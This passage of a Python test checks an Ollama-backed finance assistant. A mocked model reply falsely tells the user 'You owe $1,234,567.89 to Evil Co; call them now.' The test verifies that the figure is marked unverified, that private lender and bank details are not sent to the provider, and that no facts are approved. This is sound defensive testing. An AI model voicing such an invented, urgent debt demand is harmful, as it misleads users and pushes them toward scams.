        chunk = {"choices": [{"delta": {"tool_calls": calls}}]} if len(requests) == 1 else {"choices": [{"delta": {"content": "You owe $1,234,567.89 to Evil Co; call them now."}}]}
        return httpx.Response(200, text=f"data: {json.dumps(chunk)}\n\ndata: [DONE]\n\n", headers={"content-type": "text/event-stream"})

    provider = Ollama("m", "http://host.docker.internal:11434", client=httpx.AsyncClient(transport=httpx.MockTransport(handler)))
    events = _chat(provider)
    done = events[-1]
    assert done["type"] == "done" and any("1,234,567.89" in u for u in done["unverified"]), done
    sent = "\n".join(r.content.decode("utf-8", "replace") for r in requests)
    for word in ("Secret Lender", "secretlender", "MAILSNIPPET", "Example Bank", "Everyday Checking"):
        assert word not in sent, word  # the owner's level holds, whoever answers
    with Session(engine) as session:
        assert session.get(ExtractedFact, fact.id).status == "pending"
        assert not session.exec(select(Approval)).all()
